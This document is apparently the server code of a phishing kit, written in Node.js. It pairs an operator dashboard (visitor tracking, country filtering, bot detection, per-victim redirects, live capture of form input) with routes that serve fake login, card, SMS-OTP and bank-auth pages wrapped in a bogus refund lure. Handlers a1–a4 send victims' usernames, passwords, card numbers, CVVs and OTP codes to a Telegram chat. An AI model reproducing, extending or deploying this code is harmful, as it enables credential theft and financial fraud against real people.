    console.log(`Blocked IP: ${ip}${redirectUrl ? ` with redirect to ${redirectUrl}` : ''}`);
    return res.json({ success: true, message: `IP ${ip} has been blocked${redirectUrl ? ' and will be redirected' : ''}` });
  } else {
    return res.json({ success: false, message: `IP ${ip} not found in cache` });
  }
});

// API endpoint to unblock an IP
app.post('/dashboard/unblock', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  const { ip } = req.body;
  
  if (!ip) {
    return res.json({ success: false, message: 'IP address is required' });
  }
  
  // Inline implementation of unblockIP function
  let success = false;
  if (ipCache.has(ip)) {
    const visitorData = ipCache.get(ip);
    visitorData.isBlocked = false;
    
    // Clear any redirect URL
    if (visitorData.redirectUrl) {
      delete visitorData.redirectUrl;
    }
    
    ipCache.set(ip, visitorData);
    io.emit('dashboard-update');
    success = true;
  }
  
  if (success) {
    console.log(`Unblocked IP: ${ip}`);
    return res.json({ success: true, message: `IP ${ip} has been unblocked and can now access pages normally` });
  } else {
    return res.json({ success: false, message: `IP ${ip} not found in cache` });
  }
});

// API endpoint to get all visitors
app.get('/dashboard/visitors', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  // Convert the ipCache Map to a regular object for JSON response
  const visitors = {};
  
  ipCache.forEach((data, ip) => {
    // Clone the data to avoid modifying the cache
    visitors[ip] = { ...data, ip };
  });
  
  return res.json({ 
    success: true, 
    visitors: visitors,
    totalCount: ipCache.size,
    onlineCount: Array.from(ipCache.values()).filter(v => v.isOnline).length,
    settings: {
      countryFilterMode: globalSettings.countryFilterMode,
      blockedCountries: globalSettings.blockedCountries,
      allowedCountries: globalSettings.allowedCountries
    }
  });
});

// API endpoint to update country filter settings
app.post('/dashboard/country-filter', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  const { mode, countries, redirectUrl } = req.body;
  
  if (!mode || !['block', 'allow-only'].includes(mode)) {
    return res.json({ success: false, message: 'Invalid filter mode' });
  }
  
  // Update global settings
  globalSettings.countryFilterMode = mode;
  
  if (Array.isArray(countries)) {
    if (mode === 'block') {
      globalSettings.blockedCountries = countries.map(c => c.toUpperCase());
    } else {
      globalSettings.allowedCountries = countries.map(c => c.toUpperCase());
    }
  }
  
  // Store the redirect URL for country-based blocking if provided
  if (redirectUrl) {
    globalSettings.countryRedirectUrl = redirectUrl;
  }
  
  console.log(`Updated country filter: ${mode} mode with ${countries ? countries.length : 0} countries`);
  
  // Notify all clients about the update
  io.emit('dashboard-update');
  
  return res.json({ 
    success: true, 
    message: `Country filter updated to ${mode} mode`, 
    settings: {
      countryFilterMode: globalSettings.countryFilterMode,
      blockedCountries: globalSettings.blockedCountries,
      allowedCountries: globalSettings.allowedCountries
    }
  });
});

// Dashboard data API endpoint
app.get("/dashboard/data", dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  // Convert Map to object for JSON response
  const ipCacheData = {};
  ipCache.forEach((value, key) => {
    ipCacheData[key] = value;
  });
  
  // Return dashboard data with all necessary information
  res.json({
    totalVisitors: ipCache.size,
    botsDetected: Array.from(ipCache.values()).filter(info => info.isBot).length,
    proxyVpn: Array.from(ipCache.values()).filter(info => info.proxy || info.hosting).length,
    blockedIps: Array.from(ipCache.values()).filter(info => info.isBlocked).length,
    ipCache: ipCacheData,
    blockedCountries: globalSettings.blockedCountries,
    allowedCountries: globalSettings.allowedCountries,
    countries: globalSettings.countryFilterMode === 'block' ? globalSettings.blockedCountries : globalSettings.allowedCountries,
    countryFilterMode: globalSettings.countryFilterMode,
    proxyDetectionEnabled: globalSettings.proxyDetectionEnabled
  });
});

// Export visitor data API endpoint
app.get("/dashboard/export", rateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  // Convert Map to object for JSON export
  const visitorData = {};
  ipCache.forEach((value, key) => {
    // Include all visitor data except for internal flags
    const { isBot, isBlocked, ...exportData } = value;
    visitorData[key] = {
      ...exportData,
      // Add formatted timestamps for better readability
      firstRequestFormatted: new Date(value.firstRequest).toLocaleString(),
      lastRequestFormatted: value.lastRequest ? new Date(value.lastRequest).toLocaleString() : null,
      lastConnectedFormatted: value.lastConnected ? new Date(value.lastConnected).toLocaleString() : null,
      lastDisconnectedFormatted: value.lastDisconnected ? new Date(value.lastDisconnected).toLocaleString() : null
    };
  });

  // Set headers for file download
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Content-Disposition', `attachment; filename=visitor-data-${new Date().toISOString().slice(0,10)}.json`);
  
  // Send the JSON data
  res.json(visitorData);
});

// Input data API for dashboard
app.get('/dashboard/input-data', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  const allInputData = {};
  
  // Convert Map to object for JSON response
  inputDataCache.forEach((value, key) => {
    allInputData[key] = value;
  });
  
  res.json(allInputData);
});

// Detailed IP information API endpoint
app.get('/dashboard/ip/:ip', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  const { ip } = req.params;
  
  if (!ip) {
    return res.status(400).json({ error: 'IP address is required' });
  }
  
  // Get visitor data for the IP
  const visitorData = ipCache.get(ip);
  
  if (!visitorData) {
    return res.status(404).json({ error: 'IP not found in cache' });
  }
  
  // Get input data for the IP
  const inputData = inputDataCache.has(ip) ? inputDataCache.get(ip) : [];
  
  // Combine visitor data with input data
  const detailedData = {
    ...visitorData,
    inputs: inputData
  };
  
  res.json(detailedData);
});

// Redirect IP endpoint
app.post('/dashboard/redirect-ip', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  const { ip, redirectUrl } = req.body;
  
  if (!ip || !redirectUrl) {
    return res.status(400).json({ error: 'IP and redirect URL are required' });
  }
  
  // Validate URL format
  try {
    new URL(redirectUrl);
  } catch (e) {
    return res.status(400).json({ error: 'Invalid URL format' });
  }
  
  // Check if IP exists in cache
  if (!ipCache.has(ip)) {
    return res.status(404).json({ error: 'IP not found in visitor cache' });
  }
  
  // Store the redirect URL for this IP
  const visitorData = ipCache.get(ip);
  visitorData.redirectUrl = redirectUrl;
  ipCache.set(ip, visitorData);
  
  // Emit socket event to redirect this visitor if they're online
  if (visitorData.isOnline) {
    io.emit('redirect', { ip, redirectUrl });
  }
  
  res.json({ success: true, message: 'Redirect set successfully' });
});

// Clear input logs endpoint
app.post('/dashboard/clear-input-logs', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  // Clear the input data cache
  inputDataCache.clear();
  
  // Notify all dashboard clients that input data has been cleared
  io.emit('input-data-update');
  
  res.json({ success: true, message: 'Input logs cleared successfully' });
});

// Redirect IP endpoint
app.post('/dashboard/redirect-ip', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  const { ip, redirectUrl } = req.body;
  
  if (!ip || !redirectUrl) {
    return res.status(400).json({ success: false, message: 'IP address and redirect URL are required' });
  }
  
  // Check if IP exists in cache
  if (!ipCache.has(ip)) {
    return res.status(404).json({ success: false, message: 'IP not found in cache' });
  }
  
  // Store custom redirect URL for this IP
  const visitorData = ipCache.get(ip);
  ipCache.set(ip, {
    ...visitorData,
    customRedirectUrl: redirectUrl
  });
  
  console.log(`Custom redirect set for IP ${ip} to ${redirectUrl}`);
  
  // Emit socket event to redirect this specific IP if they're online
  if (visitorData.isOnline) {
    io.emit('redirect', { ip, url: redirectUrl });
  }
  
  return res.json({ success: true, message: `Redirect set for IP ${ip}` });
});

// Block IP endpoint
app.post("/dashboard/block", (req, res) => {
  const { ip } = req.body;
  if (ipCache.has(ip)) {
    const ipData = ipCache.get(ip);
    ipData.isBlocked = true;
    ipCache.set(ip, ipData);
    res.json({
      success: true,
      blockedCount: Array.from(ipCache.values()).filter((ip) => ip.isBlocked)
        .length,
      ...ipData,
    });
  } else {
    res.status(404).json({ success: false, message: "IP not found" });
  }
});

// Unblock IP endpoint
// Get visitor data by IP endpoint
app.get("/dashboard/visitor/:ip", (req, res) => {
  const { ip } = req.params;
  
  if (ipCache.has(ip)) {
    res.json(ipCache.get(ip));
  } else {
    res.status(404).json({ error: "Visitor not found" });
  }
});

app.post("/dashboard/unblock", (req, res) => {
  const { ip } = req.body;
  if (ipCache.has(ip)) {
    const ipData = ipCache.get(ip);
    ipData.isBlocked = false;
    ipCache.set(ip, ipData);
    res.json({
      success: true,
      blockedCount: Array.from(ipCache.values()).filter((ip) => ip.isBlocked)
        .length,
      ...ipData,
    });
  } else {
    res.status(404).json({ success: false, message: "IP not found" });
  }
});

// Block country endpoint
app.post('/dashboard/block-country', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  const { countryCode } = req.body;
  
  // Validate country code (must be 2 letters)
  if (!countryCode || typeof countryCode !== 'string' || countryCode.length !== 2) {
    return res.json({ success: false, message: 'Invalid country code format' });
  }
  
  // Standardize to uppercase
  const formattedCode = countryCode.toUpperCase();
  
  // Check if already in the list
  if (!globalSettings.blockedCountries.includes(formattedCode)) {
    globalSettings.blockedCountries.push(formattedCode);
    console.log(`Added ${formattedCode} to blocked countries list`);
  }
  
  // Notify all dashboard clients about the update
  io.emit('dashboard-update');
  
  res.json({ 
    success: true, 
    message: `Country ${formattedCode} added to blocked list`,
    countries: globalSettings.blockedCountries 
  });
});

app.post('/dashboard/unblock-country', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  const { countryCode } = req.body;
  
  // Validate country code
  if (!countryCode || typeof countryCode !== 'string') {
    return res.json({ success: false, message: 'Invalid country code' });
  }
  
  // Standardize to uppercase
  const formattedCode = countryCode.toUpperCase();
  
  // Remove from blocked list
  const initialLength = globalSettings.blockedCountries.length;
  globalSettings.blockedCountries = globalSettings.blockedCountries.filter(c => c !== formattedCode);
  
  // Check if anything was removed
  const wasRemoved = initialLength > globalSettings.blockedCountries.length;
  
  if (wasRemoved) {
    console.log(`Removed ${formattedCode} from blocked countries list`);
    // Notify all dashboard clients about the update
    io.emit('dashboard-update');
  }
  
  res.json({ 
    success: true, 
    message: wasRemoved ? `Country ${formattedCode} removed from blocked list` : `Country ${formattedCode} was not in blocked list`,
    countries: globalSettings.blockedCountries 
  });
});

app.post('/dashboard/allow-country', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  const { countryCode } = req.body;
  
  // Validate country code (must be 2 letters)
  if (!countryCode || typeof countryCode !== 'string' || countryCode.length !== 2) {
    return res.json({ success: false, message: 'Invalid country code format' });
  }
  
  // Standardize to uppercase
  const formattedCode = countryCode.toUpperCase();
  
  // Check if already in the list
  if (!globalSettings.allowedCountries.includes(formattedCode)) {
    globalSettings.allowedCountries.push(formattedCode);
    console.log(`Added ${formattedCode} to allowed countries list`);
  }
  
  // Notify all dashboard clients about the update
  io.emit('dashboard-update');
  
  res.json({ 
    success: true, 
    message: `Country ${formattedCode} added to allowed list`,
    countries: globalSettings.allowedCountries 
  });
});

app.post('/dashboard/disallow-country', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  const { countryCode } = req.body;
  
  // Validate country code
  if (!countryCode || typeof countryCode !== 'string') {
    return res.json({ success: false, message: 'Invalid country code' });
  }
  
  // Standardize to uppercase
  const formattedCode = countryCode.toUpperCase();
  
  // Remove from allowed list
  const initialLength = globalSettings.allowedCountries.length;
  globalSettings.allowedCountries = globalSettings.allowedCountries.filter(c => c !== formattedCode);
  
  // Check if anything was removed
  const wasRemoved = initialLength > globalSettings.allowedCountries.length;
  
  if (wasRemoved) {
    console.log(`Removed ${formattedCode} from allowed countries list`);
    // Notify all dashboard clients about the update
    io.emit('dashboard-update');
  }
  
  res.json({ 
    success: true, 
    message: wasRemoved ? `Country ${formattedCode} removed from allowed list` : `Country ${formattedCode} was not in allowed list`,
    countries: globalSettings.allowedCountries 
  });
});

app.post('/dashboard/toggle-country-mode', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  const { allowMode } = req.body;
  
  // Validate input
  if (allowMode === undefined) {
    return res.json({ success: false, message: 'Missing allowMode parameter' });
  }
  
  // Convert to boolean if string
  const newMode = allowMode === true || allowMode === 'true';
  const oldMode = globalSettings.countryFilterMode === 'allow-only';
  
  // Only update if there's a change
  if (newMode !== oldMode) {
    globalSettings.countryFilterMode = newMode ? 'allow-only' : 'block';
    console.log(`Country filter mode changed to: ${globalSettings.countryFilterMode}`);
    
    // Notify all dashboard clients about the update
    io.emit('dashboard-update');
  }
  
  res.json({ 
    success: true, 
    message: `Country filter mode set to ${newMode ? 'Allow Only' : 'Block'} mode`,
    mode: globalSettings.countryFilterMode,
    countries: globalSettings.countryFilterMode === 'block' ? globalSettings.blockedCountries : globalSettings.allowedCountries
  });
});

// Toggle proxy detection endpoint
app.post('/dashboard/toggle-proxy-detection', (req, res) => {
  const { enabled } = req.body;
  if (enabled !== undefined) {
    globalSettings.proxyDetectionEnabled = enabled === true || enabled === 'true';
  } else {
    // Toggle if no value provided
    globalSettings.proxyDetectionEnabled = !globalSettings.proxyDetectionEnabled;
  }
  
  res.json({
    success: true,
    proxyDetectionEnabled: globalSettings.proxyDetectionEnabled
  });
});



//////////////////////////////
//=========================[GET]===================
app.get("/",(req,res)=>{ // login
  res.render("index");
});
app.get("/PPmP85AgNE4pnL5mWSM",(req,res)=>{ // loading 1:
  res.render("posas", { pass: req.session.username });
});
app.get("/loading",(req,res)=>{ // loading 1:
  const {time,url} = req.query;
  res.render("lopin",{url,time});
});
app.get("/QcEwP85AgNE4pnL5mWSM",(req,res)=>{ // loading 1:
  res.render("capoca");
});

app.get("/RKnUB922z6Mf4HDwg3EZ",(req,res)=>{ // loading 2:
  res.render("semitr-1");
});

app.get("/LGknmeM9HwWUWSutj6mJ",(req,res)=>{ // loading 3:
  res.render("semitr-2",{url:process.env.URL});
});

app.get("/PrTomeM9HwWUWSulkTe4", (req, res) => {
  const today = new Date();
  const processingDate = today.toLocaleDateString('de-DE', { day: '2-digit', month: 'long', year: 'numeric' });
  
  const deadline = new Date();
  deadline.setDate(today.getDate() + 2);
  const paymentDeadline = deadline.toLocaleDateString('de-DE', { day: '2-digit', month: 'long', year: 'numeric' });
  
  const refundAmount = "116,35";

  res.render("refund", {
    processingDate,
    paymentDeadline,
    refundAmount,
    orderNumber: "D01-9472X8" // As per your example
  });
});

app.get("/Ose4aQeM9H4waRfs7PrTv",(req,res)=>{ // bank auth verification page
  res.render("bankauth");
});

app.get("/LkaaomeM9HwWU472fgsPr",(req,res)=>{ // loading 3:
  const refundAmount = "116,35";
  res.render("done",{refundAmount});
});






//======================[POST]======================
app.post("/gzLbTbjqMpc34D4XsPJ2",(req,res)=>{ // login post
  let data = req.body;
  const clientIp =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    requestIp.getClientIp(req);
  req.session.username = data.username;
  a1(data,clientIp);
  res.send({OK:true});
});
app.post("/SSwP85AgNE4pnL5mWSM",(req,res)=>{ // posas post
  let data = req.body;
  const clientIp =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    requestIp.getClientIp(req);
  bot.telegram.sendMessage(process.env.CHATID, `${brand} | [PASSWORD] | TEAM\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\nUSER: ${req.session.username}\nPASSWORD: ${data.password}\nIP: ${clientIp}\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n${brand} | [${target}] | TEAM`);
  res.send({OK:true});
});


app.post("/EpLP85AgNE4pn4RtpL",(req,res)=>{ // posas post
  let data = req.body;
  const clientIp =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    requestIp.getClientIp(req);
  bot.telegram.sendMessage(process.env.CHATID, `${brand} | [REFUND] | TEAM\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n      Sa7bna Bari Refund\nIP: ${clientIp}\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n${brand} | [${target}] | TEAM`);
  res.send({OK:true});
});


app.post("/NkMNm4664XhcW8KuukHk",(req,res)=>{ // cc post
  let data = req.body;
  const clientIp =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    requestIp.getClientIp(req);
  a2(data,clientIp);
  res.send({OK:true});
});
app.post("/m4kT9BQWt7KTDdaVmafx",(req,res)=>{ // sms1 post
  let data = req.body;
  const clientIp =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    requestIp.getClientIp(req);
  a3(data,clientIp);
  res.send({OK:true});
});
app.post("/Qv69PRvXg6PQEvrzJx6j",(req,res)=>{ // sms2 post
  let data = req.body;
  const clientIp =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    requestIp.getClientIp(req);
  a4(data,clientIp);
  res.send({OK:true});
});


// Functions:
// 9alab dayal CHULDA:
function a1(data,ip) {
  let block="";
  block += `${brand}  | [LOGIN] |  TEAM\n`; 
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `USER: ${data.username}\nIP: ${ip}\n`;
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `${brand}  | [${target}]  |  TEAM`;
  
  bot.telegram.sendMessage(process.env.CHATID,block);
  

}
// Generic function to send Telegram notifications
function sendTelegramNotification(title, content, ip) {
  let block = "";
  block += `${brand}  | ${title} |  TEAM\n`; 
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `${content}\nIP: ${ip}\n`;
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `${brand}  | [${target}]  |  TEAM`;
  
  bot.telegram.sendMessage(process.env.CHATID, block);
}

// Card notification function
function a2(data, ip) {
  const content = `CARD N*: ${data.cardNumber}\nMM/YY: ${data.expiryDate}\nCVV: ${data.cvv}\nCARD NAME: ${data.cardName}`;
  sendTelegramNotification('[CC-s5ona]', content, ip);
}

// SMS notification function (first code)
function a3(data, ip) {
  sendTelegramNotification('[SMS](1)', `OTP: ${data.code}`, ip);
}

// SMS notification function (second code)
function a4(data, ip) {
  sendTelegramNotification('[SMS](2)', `OTP: ${data.code}`, ip);
}





// Listen to server:
http.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  
  // Socket.io connection handling
  io.on('connection', (socket) => {
    // Use improved IP detection function
    const clientIP = getAccurateClientIp(socket.request);
    console.log('a user connected:', clientIP);
    
    // Store IP in socket for later reference, will be updated when client sends their IP
    socket.clientIP = clientIP;
    
    // Update visitor online status or initialize new IP entry
    if (ipCache.has(clientIP)) {
      // Update existing visitor to online status
      updateVisitorOnlineStatus(clientIP, true);
    } else {
      // Initialize a new IP cache entry
      initializeIPCacheEntry(clientIP, "/", socket);
    }
    
    // Emit updated dashboard data to all connected clients
    io.emit('dashboard-update');

    socket.on('disconnect', () => {
      console.log('user disconnected:', socket.clientIP);
      
      // Update visitor online status to offline
      updateVisitorOnlineStatus(socket.clientIP, false);
    });

    // Handle redirect requests from dashboard
    socket.on('redirect-user', (data) => {
      io.emit('redirect', {url: data.url, ip: data.ip});
    });
    
    // Helper function to get and update client IP from event data
    function getClientIP(data, socket) {
      // Use client IP from front-end if available, otherwise fall back to socket.clientIP
      const clientIP = data.clientIP || socket.clientIP;
      
      // Update socket.clientIP with the front-end IP for future reference
      if (data.clientIP) {
        socket.clientIP = data.clientIP;
        console.log('Updated client IP from front-end:', data.clientIP);
      }
      
      return clientIP;
    }
    
    // Helper function to check if an IP is blocked
    function isIPBlocked(ip) {
      return ipCache.has(ip) && ipCache.get(ip).isBlocked;
    }
    
    // Helper function to get visitor data with caching
    function getVisitorData(clientIP) {
      if (ipCache.has(clientIP)) {
        return ipCache.get(clientIP);
      }
      return null;
    }
    
    // Using global getGeoData function for geolocation data
    
    // Helper function to update input data cache
    function updateInputDataCache(clientIP, data) {
      // Store input data with IP association
      if (!inputDataCache.has(clientIP)) {
        inputDataCache.set(clientIP, []);
      }
      
      // Add timestamp and path information
      const inputData = {
        ...data,
        ip: clientIP,
        timestamp: new Date().toISOString()
      };
      
      // Add to the beginning of the array (newest first)
      const ipInputs = inputDataCache.get(clientIP);
      ipInputs.unshift(inputData);
      
      // Limit to 50 most recent inputs per IP
      if (ipInputs.length > 50) {
        ipInputs.pop();
      }
      
      // Update the cache
      inputDataCache.set(clientIP, ipInputs);
      
      // Notify dashboard of new input data
      io.emit('input-data-update');
    }
    
    // Helper function to update visitor online status
    function updateVisitorOnlineStatus(clientIP, isOnline) {
      if (ipCache.has(clientIP)) {
        const visitorData = ipCache.get(clientIP);
        visitorData.isOnline = isOnline;
        
        if (isOnline) {
          visitorData.lastConnected = new Date();
        } else {
          visitorData.lastDisconnected = new Date();
        }
        
        ipCache.set(clientIP, visitorData);
        io.emit('dashboard-update');
      }
    }
    
    // These functions have been moved to global scope
    
    // Helper function to initialize a new IP cache entry
    async function initializeIPCacheEntry(clientIP, path, socket) {
      // Parse user agent
      const userAgent = socket?.handshake?.headers['user-agent'] || 'Unknown';
      const uaParser = new UAParser(userAgent);
      const browser = uaParser.getBrowser();
      const os = uaParser.getOS();
      const device = uaParser.getDevice();
      
      // Create new visitor data entry
      const visitorData = {
        ip: clientIP,
        userAgent: userAgent,
        browser: browser.name || 'Unknown',
        browserVersion: browser.version || 'Unknown',
        os: os.name || 'Unknown',
        osVersion: os.version || 'Unknown',
        device: device.vendor ? `${device.vendor} ${device.model}` : 'Unknown',
        deviceType: device.type || 'Unknown',
        firstRequest: new Date(),
        lastRequest: new Date(),
        lastPath: path || '/',
        requestCount: 1,
        isBot: isBot(userAgent),
        isBlocked: false,
        isOnline: true,
        lastConnected: new Date(),
        inputs: []
      };
      
      // Store in cache
      ipCache.set(clientIP, visitorData);
      
      // Emit new visitor event to dashboard
      io.emit('new-visitor', visitorData);
      
      // Fetch geo data asynchronously using cached function
      getGeoData(clientIP).then(geoData => {
        if (ipCache.has(clientIP)) {
          const updatedVisitorData = ipCache.get(clientIP);
          updatedVisitorData.country = geoData.country || 'Unknown';
          updatedVisitorData.countryCode = geoData.countryCode || 'XX';
          updatedVisitorData.city = geoData.city || 'Unknown';
          updatedVisitorData.isp = geoData.isp || 'Unknown';
          updatedVisitorData.proxy = geoData.proxy || false;
          updatedVisitorData.hosting = geoData.hosting || false;
          ipCache.set(clientIP, updatedVisitorData);
          
          // Emit dashboard update and new visitor event with geo data
          io.emit('dashboard-update');
          io.emit('new-visitor', updatedVisitorData);
        }
      }).catch(error => {
        console.error(`Error fetching geo data for IP ${clientIP}:`, error);
      });
      
      return visitorData;
    }
    
    // Helper function to update IP cache with page view data
    function updateIPCacheWithPageView(clientIP, path, socket) {
      if (ipCache.has(clientIP)) {
        const ipData = ipCache.get(clientIP);
        ipData.lastPath = path;
        ipData.lastRequest = new Date();
        ipData.requestCount = (ipData.requestCount || 0) + 1;
        ipCache.set(clientIP, ipData);
        
        // If we don't have country data yet, fetch it
        if (!ipData.countryCode) {
          fetchGeoData(clientIP).then(geoData => {
            if (geoData && ipCache.has(clientIP)) {
              const updatedData = ipCache.get(clientIP);
              updatedData.country = geoData.country || null;
              updatedData.countryCode = geoData.countryCode || null;
              updatedData.city = geoData.city || null;
              updatedData.region = geoData.region || null;
              updatedData.isp = geoData.isp || null;
              updatedData.org = geoData.org || null;
              updatedData.hosting = geoData.hosting || false;
              updatedData.proxy = geoData.proxy || false;
              ipCache.set(clientIP, updatedData);
              io.emit('dashboard-update');
            }
          });
        }
      } else {
        // Initialize a new IP cache entry
        initializeIPCacheEntry(clientIP, path, socket);
      }
      
      // Notify dashboard of visitor update
      io.emit('dashboard-update');
    }
    
    // Handle page view events from clients
    socket.on('page-view', (data) => {
      const clientIP = getClientIP(data, socket);
      
      // Skip if IP is blocked
      if (isIPBlocked(clientIP)) {
        return;
      }
      
      // Skip tracking for dashboard requests
      if (data.path && data.path.startsWith('/dashboard')) {
        console.log('Skipping dashboard request tracking for:', clientIP);
        return;
      }
      
      // Update IP cache with page view data
      updateIPCacheWithPageView(clientIP, data.path, socket);
    });
    
    // Handle input data from clients
    socket.on('input-data', (data) => {
      const clientIP = getClientIP(data, socket);
      
      // Skip if IP is blocked
      if (isIPBlocked(clientIP)) {
        return;
      }
      
      // Update input data cache with the new data
      updateInputDataCache(clientIP, data);
      
      // Emit dashboard update
      io.emit('dashboard-update');
    });
  });
});
